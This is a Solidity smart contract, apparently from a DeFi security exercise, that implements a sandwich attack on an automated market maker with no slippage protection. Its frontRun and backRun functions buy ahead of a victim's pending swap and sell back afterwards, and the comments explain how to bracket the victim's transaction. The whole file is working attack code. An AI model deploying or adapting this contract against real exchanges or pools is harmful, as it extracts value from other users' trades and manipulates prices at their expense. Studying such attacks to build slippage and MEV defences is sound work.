// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {IERC20} from "../interfaces/IERC20.sol";

interface IVulnerableAMM {
    function swap(address tokenIn, uint256 amountIn, address to) external returns (uint256);
}

/// @notice sandwiches a victim swap on a no-slippage AMM: buy before, sell after.
/// front-run and back-run are separate calls so the caller can place the victim's
/// swap between them, exactly as a searcher brackets a pending transaction.
contract SandwichAttack {
    IVulnerableAMM public immutable amm;
    address public immutable tokenIn; // asset the victim sells; we front-run in it
    address public immutable tokenOut; // asset the victim buys

    uint256 public boughtOut; // tokenOut acquired during the front-run

    constructor(address _amm, address _tokenIn, address _tokenOut) {
        amm = IVulnerableAMM(_amm);
        tokenIn = _tokenIn;
        tokenOut = _tokenOut;
    }

    // buy tokenOut ahead of the victim, making the price they receive worse
    function frontRun(uint256 amountIn) external returns (uint256) {
        IERC20(tokenIn).approve(address(amm), amountIn);
        boughtOut = amm.swap(tokenIn, amountIn, address(this));
        return boughtOut;
    }

    // sell everything back after the victim has moved the price in our favor
    function backRun() external returns (uint256) {
        uint256 amount = boughtOut;
        boughtOut = 0;
        IERC20(tokenOut).approve(address(amm), amount);
        return amm.swap(tokenOut, amount, address(this));
    }
}
